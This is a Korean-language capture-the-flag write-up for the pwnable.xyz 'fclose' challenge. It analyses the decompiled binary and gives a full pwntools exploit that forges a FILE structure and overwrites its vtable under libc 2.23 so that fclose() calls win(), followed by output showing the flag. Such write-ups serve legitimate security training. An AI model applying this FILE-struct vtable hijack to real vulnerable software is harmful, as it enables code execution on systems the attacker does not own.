# [pwnable.xyz] fclose

:writing_hand: [h0meb0dy](mailto:h0meb0dysj@gmail.com)

> Challenge is using libc 2.23
>
> Release: [fclose.zip](https://github.com/h0meb0dy/pwnable.xyz/files/8989873/fclose.zip)

## Mitigation

![image](https://user-images.githubusercontent.com/104156058/175891828-808753c5-0ab3-47f4-ba45-3fd49e151a92.png)

## Analysis

### `win()`

```c
int win()
{
  return system("cat flag");
}
```

`win()`이 실행되도록 하면 플래그를 획득할 수 있다.

### `main()`

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  setup(argc, argv, envp);
  printf("> ");
  read(0, &input, 0x404uLL);
  fclose(&input);
  return 0;
}
```

`main()` 함수는 간단한데, `input`에 `0x404`바이트를 입력받고 `fclose()`를 실행한다. 즉 `input`은 파일 구조체이고 구조체 전체를 원하는 값으로 덮을 수 있다.

## Exploit

파일 구조체 전체를 원하는 값으로 덮어쓸 수 있기 때문에 vtable overwrite 기법을 이용하여 `win()`이 실행되도록 할 수 있다. 문제 설명을 읽어보면 libc 2.23 버전을 사용하고 있어서 vtable check가 존재하지 않는다.

![image](https://user-images.githubusercontent.com/104156058/175906353-63f76f59-07da-49fb-a729-cd83f1087a91.png)

`fclose()`는 내부적으로 `_IO_file_jumps+0x10`에 있는 `_IO_new_file_finish()`를 호출하는데, `_IO_new_fclose+48`부터 `_IO_new_fclose+60`까지의 코드가 이 과정에 해당한다. 이 코드까지 도달하기 위해서 딱히 필요한 조건은 없는데, `_lock` 필드(`&fp+0x88`)에는 쓰기 권한이 있는 주소를 넣어야 한다.

### Full exploit

```python
from pwn import *

REMOTE = True

if not REMOTE:
    r = process('./release/challenge')
else:
    r = remote('svc.pwnable.xyz', 30018)

fp = 0x601260
win = 0x4007ec

payload = b''
payload = payload.ljust(0x88, b'\x00')
payload += p64(fp + 0x120) # _lock
payload = payload.ljust(0xd8, b'\x00')
payload += p64(fp + 0x100) # vtable
payload = payload.ljust(0x110, b'\x00')
payload += p64(win)

r.sendafter('> ', payload)

r.interactive()
```

```
$ python3 ex.py
[+] Opening connection to svc.pwnable.xyz on port 30018: Done
[*] Switching to interactive mode
FLAG{_IO_FILE_plus_ch3cked}
```